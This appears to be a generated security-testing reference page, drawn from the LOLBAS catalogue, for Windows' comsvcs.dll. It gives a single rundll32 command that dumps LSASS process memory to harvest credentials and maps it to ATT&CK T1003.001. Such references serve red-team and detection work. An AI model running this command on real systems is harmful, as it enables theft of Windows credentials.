---
parsed_by: focuslocust
source: commands
type: generated
---
# Comsvcs.dll Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Comsvcs.dll

Tool page: [Comsvcs.dll](../../tools/windows/comsvcs.dll.md)

### Dump Lsass.exe process memory to retrieve credentials.

```text
rundll32 C:\windows\system32\comsvcs.dll MiniDump {LSASS_PID} dump.bin full
```

Description:

Calls the MiniDump exported function of comsvcs.dll, which in turns calls MiniDumpWriteDump.

Related ATT&CK:

- [T1003.001](../../attack/techniques/T1003.001-lsass-memory.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/comsvcs.yml` |
| Evidence | Command preserved from source parser. |
